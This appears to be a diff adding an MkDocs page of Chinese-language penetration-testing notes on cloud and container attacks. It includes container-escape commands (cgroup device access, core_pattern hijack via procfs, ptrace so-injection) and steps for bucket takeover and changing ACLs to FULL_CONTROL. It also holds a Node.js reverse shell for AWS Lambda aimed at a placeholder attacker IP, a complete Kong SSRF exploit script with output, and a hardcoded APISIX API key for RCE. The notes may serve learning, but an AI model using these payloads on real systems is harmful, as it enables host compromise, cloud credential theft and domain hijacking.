+3569 3437 8:1 /var/lib/docker/containers/ab86a043d48f6f45b0ee04a70bb1f193442c8c13c712347e1c5320de3d1c50b8/hosts /mnt/etc/hosts rw,relatime master:240 - ext4 /dev/sda1 rw,errors=remount-ro
+3571 3430 8:1 /var/lib/docker/volumes/minikube/_data/lib/docker/containers/efd43944db8144aec6f7f05f07ca78a3462c9cc7d8dcd2c9aada0bf839f66518/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
+3572 3430 8:1 /var/lib/docker/volumes/minikube/_data/lib/docker/containers/efd43944db8144aec6f7f05f07ca78a3462c9cc7d8dcd2c9aada0bf839f66518/hostname /etc/hostname rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
+3573 3430 8:1 /var/lib/docker/volumes/minikube/_data/lib/kubelet/pods/63b850c3-9dee-4467-bf69-f473a459171a/etc-hosts /etc/hosts rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
+</code></pre>
+<p>mknod创建文件目录</p>
+<pre><code class="language-text-plain">mknod mknod_near b 8 1
+debugfs -w mknod_near
+ls
+</code></pre>
+<p>直接cdk一键执行</p>
+<pre><code class="language-text-plain">./cdk_linux_amd64 run lxcfs-rw
+</code></pre>
+<h3 id="cgroup">利用cgroup逃逸</h3>
+<p>当容器配置了特权时使用。</p>
+<p>将cgroup挂载到容器</p>
+<pre><code class="language-text-plain">mkdir /tmp/dev
+mount -t cgroup -o devices devices /tmp/dev/
+</code></pre>
+<p>修改容器的cgroup访问权限</p>
+<pre><code class="language-text-plain">echo a &gt; /tmp/dev/docker/b76c0b53a9b8fb8478f680503164b37eb27c2805043fecabb450c48eaad10b57/devices.allow
+</code></pre>
+<p>mknod 创建设备文件目录</p>
+<pre><code class="language-text-plain">mknod near b 252 1
+debugfs -w near
+</code></pre>
+<h3 id="proc">proc挂载逃逸</h3>
+<p>查看宿主机的文件结构</p>
+<pre><code class="language-text-plain">容器内执行
+sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
+宿主机的路径是无法打开的，且重复多次的
+/var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-10-09_14-12-51.jpg" /></p>
+<p>在容器内根目录创建恶意文件，对应宿主机的<code>/var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff</code>路径</p>
+<p><img alt="" src="Snipaste_2023-10-09_14-13-11.jpg" /></p>
+<p>修改容器内core_pattern文件，也就相当于修改了宿主机proc里的文件</p>
+<pre><code class="language-text-plain">echo -e &quot;|/var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff/m.sh \rcore      &quot;  &gt; /proc/sys/kernel/core_pattern
+</code></pre>
+<p>触发容器内Segmentation fault之后便执行了恶意文件</p>
+<pre><code class="language-text-plain">└─# cat bengkui.c
+#include &lt;stdio.h&gt;
+int main(void)
+{
+    int *a = NULL;
+    *a = 1;
+    return 0;
+}
+</code></pre>
+<p>使用cdk直接执行命令，可以在容器根目录创建一个脚本，然后执行这个脚本。需要注意容器根目录在宿主机的路径。</p>
+<pre><code class="language-text-plain">./cdk run mount-procfs /proc &quot;bash /var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff/m.sh&quot;
+</code></pre>
+<p>在当前最新版k8s集群中，安装后默认挂载了/proc。可以从master直接逃逸到宿主机，同理也可以用于容器逃逸到node。</p>
+<pre><code class="language-text-plain">kubectl version
+GitVersion:v1.23.1
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-10-09_14-13-29.jpg" /></p>
+<h3 id="sys_ptrace">SYS_PTRACE逃逸</h3>
+<p>当赋予容器<code>cap_sys_ptrace</code>权限时，容器可以进行进程注入逃逸到宿主机。</p>
+<p>检查权限</p>
+<pre><code class="language-text-plain">capsh --print
+</code></pre>
+<p>cdk遍历进程</p>
+<pre><code class="language-text-plain">./cdk run check-ptrace
+</code></pre>
+<p>注入so文件</p>
+<p>https://github.com/gaffe23/linux-inject</p>
+<pre><code class="language-text-plain">./inject -p 79230 fantan.so
+</code></pre>
+<h3 id="debugfs-">debugfs逃逸利用-比较麻烦还未测试过</h3>
+<p>https://fun0nydg.github.io/2021/06/19/The-role-of-debugfs-in-container-escape.html</p>
+<h3 id="cve-2020-15257">CVE-2020-15257</h3>
+<p>使用cdk的shim-pwn</p>
+<h3 id="_11">内核漏洞逃逸</h3>
+<p>CVE-2016-5195或CVE-2020-14386</p>
+<h2 id="_12">自动化利用工具</h2>
+<h3 id="kube-hunter">kube-hunter</h3>
+<p>https://github.com/aquasecurity/kube-hunter</p>
+<p><img alt="" src="../../images/Snipaste_2023-10-09_14-13-53.jpg" /></p>
+<h3 id="cdk">cdk</h3>
+<p>https://github.com/cdk-team/CDK</p>
+<pre><code class="language-text-plain"># 信息收集
+cdk evaluate
+
+# 列举全部exp
+cdk run --list
+
+# 执行指定的exp
+cdk run &lt;script-name&gt; [options]
+</code></pre>
+<h2 id="_13">其他</h2>
+<h3 id="serverless">Serverless渗透</h3>
+<p>也就是云函数，云函数有存活时间，如果有幸打到了一台云函数的机器需要立刻查看env找到AKSK，一般遇不到。</p>
+<h3 id="_14">对象存储渗透</h3>
+<p>除非是找到了SecretId、SecretKey，或者桶错误配置了权限，否则无法对他人的桶进行操作。</p>
+<p>当打开网站发现返回了一个xml结果，此时可以判断是否是桶从而进行进一步攻击尝试，自建域名下也可能是桶，因为可以绑定cname。</p>
+<h4 id="aws-s3">AWS S3</h4>
+<h5 id="_15">指纹</h5>
+<p>AWS的中包含BucketName字样。</p>
+<h5 id="_16">爆破</h5>
+<p>根据状态码判断</p>
+<p><code>InvalidBucketName</code> 和 <code>NoSuchBucket</code>代表不存在</p>
+<p><code>AccessDenied</code>或者列出信息代表存在</p>
+<h5 id="_17">利用</h5>
+<p>遍历文件、PUT上传文件</p>
+<p>在桶弃用的情况下将桶加到自己的账号里面进行接管，如果此时这个桶还绑定了cname记录，那么相当于接管目标的域名。</p>
+<p>修改桶里的资源文件以便钓鱼</p>
+<p>读取配置以便进行访问敏感文件</p>
+<p>修改桶的ACL</p>
+<p>修改对象的ACL</p>
+<p>参考：https://mp.weixin.qq.com/s/aqTnyNgTSBan_FpqfFRb7Q</p>
+<h4 id="oss">阿里云OSS</h4>
+<p>和AWS S3一样</p>
+<p>格式是<code>xxxx.oss-cn-beijing.aliyuncs.com</code></p>
+<p>根据OSS地区不同，可能需要变更城市名称</p>
+<p>利用点和AWS差不多，命令语法略有区别</p>
+<p>官方文档</p>
+<p><a href="https://help.aliyun.com/document_detail/31891.html">控制台操作指南 - 对象存储 OSS - 阿里云</a></p>
+<pre><code class="language-text-plain">获取OSS配置
+ossutil bucket-policy oss://xxxxx --method get
+修改配置
+ossutil bucket-policy oss://xxxxx --method put xx.json
+</code></pre>
+<h4 id="obs">华为云OBS</h4>
+<p>都差不多的，格式是 <code>xxxx.obs.cn-south-1.myhuaweicloud.com</code>。可以直接去自己的控制台添加桶，加不到说明已存在，可以尝试进一步利用。</p>
+<p>遇到时再读官方文档</p>
+<p><a href="https://support.huaweicloud.com/utiltg-obs/obs_11_0005.html">初始化配置_对象存储服务 OBS_obsutil_快速入门_华为云</a></p>
+<h4 id="cos">腾讯云COS</h4>
+<p>腾讯云相较安全一点，因为腾讯云的桶在生成时会在访问地址中生成一个时间戳，可以避免桶爆破和创建相同桶名接管域名的问题。</p>
+<p>遇到时再读官方文档</p>
+<p><a href="https://cloud.tencent.com/document/product/436/63143">对象存储 COSCLI 简介 - 工具指南 - 文档中心 - 腾讯云</a></p>
+<h4 id="blob">微软云Blob</h4>
+<p>格式是以账号命令，<code>xxxx.blob.core.windows.net</code></p>
+<p>使用<code>https://xxxx.blob.core.windows.net/xxxx?restype=container&amp;comp=list</code>列出对象</p>
+<p><a href="https://docs.microsoft.com/zh-cn/azure/storage/blobs/storage-blobs-introduction">Blob（对象）存储简介 - Azure Storage | Microsoft Docs</a></p>
+<h4 id="gcs">谷歌云GCS</h4>
+<p>格式是以账号为路径<code>https://storage.googleapis.com/xxxx</code></p>
+<p>https://cloud.google.com/storage/#section-4</p>
+<h4 id="_18">其他云平台</h4>
+<p>思路都一样，遇到了再去翻文档就是了。</p>
+<h3 id="aws-lambdashell">AWS Lambda反弹shell</h3>
+<pre><code class="language-text-plain">(function(){
+    var net = require(&quot;net&quot;),
+    cp = require(&quot;child_process&quot;),
+    sh = cp.spawn(&quot;/bin/sh&quot;, []);
+    var client = new net.Socket();
+    client.connect(8080, &quot;此处替换为攻击端IP&quot;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+</code></pre>
+<h3 id="_19">敏感的端口</h3>
+<pre><code class="language-text-plain">kube-apiserver: 6443, 8080
+kubectl proxy: 8080, 8081
+kubelet: 10250, 10255, 4149
+dashboard: 30000
+docker api: 2375
+etcd: 2379, 2380
+kube-controller-manager: 10252
+kube-proxy: 10256, 31442
+kube-scheduler: 10251
+weave: 6781, 6782, 6783
+kubeflow-dashboard: 8080
+</code></pre>
+<h3 id="kong-api">Kong API网关开源版</h3>
+<p>指纹</p>
+<p>服务端返回</p>
+<p><code>Server: kong/x.x.x</code></p>
+<h4 id="cve-2020-11710">CVE-2020-11710</h4>
+<p>利用版本小于2.0.3，可以直接进入Kong API网关内网</p>
+<pre><code class="language-text-plain">usage: kong-pwn.py [-h] -u URL -s SSRF [-p PROXY]
+kong-pwn.py: error: the following arguments are required: -u/--url, -s/--ssrf
+
+$ python3 kong-pwn.py -u http://127.0.0.1:8001
+[+] Service Added [+]
+[+] Route Added [+]
+
+[+] Testing Kong for Metadata Proxy
+curl http://127.0.0.1/foo/ -H &quot;Host: metadata.local&quot; -H &quot;Metadata: true&quot; -H &quot;Metadata-Flavor: Google&quot;
+
+1.0
+2007-01-19
+2007-03-01
+2007-08-29
+2007-10-10
+2007-12-15
+2008-02-01
+2008-09-01
+2009-04-04
+2011-01-01
+2011-05-01
+2012-01-12
+2014-02-25
+2014-11-05
+2015-10-20
+2016-04-19
+2016-06-30
+2016-09-02
+2018-03-28
+2018-08-17
+2018-09-24
+2019-10-01
+latest
+
+[+] To remove added routes and services do the following
+curl -iX DELETE http://127.0.0.1:8001/routes/metadata-endpoint
+curl -iX DELETE http://127.0.0.1:8001/services/metadata-endpoint
+</code></pre>
+<pre><code class="language-text-plain">#!/usr/bin/env python
+#
+# Kong SSRF 
+#
+#
+# By @RandomRobbieBF
+# 
+#
+
+import requests
+import json
+import sys
+import argparse
+import re
+import os.path
+import json
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+session = requests.Session()
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, required=True,help=&quot;Kong APi url can be http or https&quot;)
+parser.add_argument(&quot;-s&quot;, &quot;--ssrf&quot;, default=&quot;http://169.254.169.254&quot;, required=False,help=&quot;What Internal URL to proxy http:// or https://&quot;)
+parser.add_argument(&quot;-p&quot;, &quot;--proxy&quot;,required=False, help=&quot;Proxy for debugging&quot;)
+
+args = parser.parse_args()
+url = args.url
+proxy = args.proxy
+ssrfurl = args.ssrf
+
+if proxy:
+    proxy = args.proxy
+else:
+    proxy = &quot;&quot;
+
+
+http_proxy = proxy
+proxyDict = { 
+              &quot;http&quot;  : http_proxy, 
+              &quot;https&quot; : http_proxy, 
+              &quot;ftp&quot;   : http_proxy
+            }
+
+
+
+def add_service(url):
+    paramsPost = {&quot;name&quot;:&quot;metadata-endpoint&quot;,&quot;url&quot;:&quot;&quot;+ssrfurl+&quot;&quot;}
+    headers = {&quot;User-Agent&quot;:&quot;curl/7.64.1&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept&quot;:&quot;*/*&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;}
+    response = session.post(&quot;&quot;+url+&quot;/services&quot;, data=paramsPost, headers=headers,verify=False, proxies=proxyDict)
+    if response.status_code == 201:
+        print (&quot;[+] Service Added [+]&quot;)
+        y = json.loads(response.text)
+        try:
+            id = y[&quot;id&quot;]
+            return id
+        except:
+            print (&quot;[-] Error Parsing ID of new service  [-]&quot;)
+            sys.exit(0)
+    else:
+        print(&quot;Error:\n\n&quot;+response.text+&quot;&quot;)
+        sys.exit(0)
+
+
+
+def add_route(url,id):
+    paramsPostDict = {&quot;hosts[]&quot;:&quot;metadata.local&quot;,&quot;paths[]&quot;:&quot;/foo&quot;,&quot;service.id&quot;:&quot;&quot;+id+&quot;&quot;,&quot;name&quot;:&quot;metadata-endpoint&quot;}
+    paramsPost = &quot;&amp;&quot;.join(&quot;%s=%s&quot; % (k,v) for k,v in paramsPostDict.items())
+    headers = {&quot;User-Agent&quot;:&quot;curl/7.64.1&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept&quot;:&quot;*/*&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;}
+    response = session.post(&quot;&quot;+url+&quot;/routes/&quot;, data=paramsPost, headers=headers,verify=False, proxies=proxyDict)
+    if response.status_code == 201:
+        print (&quot;[+] Route Added [+]&quot;)
+        y = json.loads(response.text)
+        rid = y[&quot;id&quot;]
+        t = url.replace(&quot;:8001&quot;,&quot;&quot;)
+        print(&quot;\n[+] Testing Kong for Metadata Proxy&quot;)
+        cmd = ('curl '+t+'/foo/ -H &quot;Host: metadata.local&quot; -H &quot;Metadata: true&quot; -H &quot;Metadata-Flavor: Google&quot;')
+        print(cmd)
+        os.system(cmd)
+        print (&quot;\n\n[+] To remove added routes and services do the following&quot;)
+        print(&quot;curl -iX DELETE &quot;+url+&quot;/routes/metadata-endpoint&quot;)
+        print(&quot;curl -iX DELETE &quot;+url+&quot;/services/metadata-endpoint&quot;)
+
+    else:
+        print(&quot;Error:\n\n&quot;+response.text+&quot;&quot;)
+        sys.exit(0)
+
+
+
+
+
+id = add_service(url)
+add_route(url,id)    
+</code></pre>
+<h3 id="apache-apisix">Apache APISIX</h3>
+<p>默认端口9000，指纹直接/apisix</p>
+<h4 id="apikeyrce">APIKEY硬编码RCE</h4>
+<p>添加一个http头：X-API-KEY: edd1c9f034335f136f87ad84b625c8f1</p>
+<h4 id="_20">其他漏洞</h4>
+<p>网上搜</p>
+<pre><code class="language-text-plain">尝试列出对象
+aws s3 ls s3://xxxx/duixiang
+尝试读取对象ACL
+aws s3api get-object-acl --bucket xxxx--key duixiang
+尝试修改对象ACL
+根据查看的结果，修改下面的属性然后保存为json
+&quot;Permission&quot;: &quot;FULL_CONTROL&quot;
+aws s3api put-object-acl --bucket xxxx--key duixiang--access-control-policy file://acl.json
+</code></pre>
+<pre><code class="language-text-plain">尝试列出桶
+aws s3api list-objects --bucket xxxx
+查看桶的ACL
+aws s3api get-bucket-acl --bucket xxxx
+尝试修改桶ACL
+aws s3api put-bucket-acl --bucket xxxx --access-control-policy file://acl.json
+根据查看的结果，修改下面的属性然后保存为json
+&quot;Permission&quot;: &quot;FULL_CONTROL&quot;
+</code></pre>
+<pre><code class="language-text-plain">aws s3api get-bucket-policy --bucket xxxx --output text | python3 -m json.tool
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-link">
+        !!Windows安全笔记
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Docker/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Docker/" class="btn btn-xs btn-link">
+        Docker
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
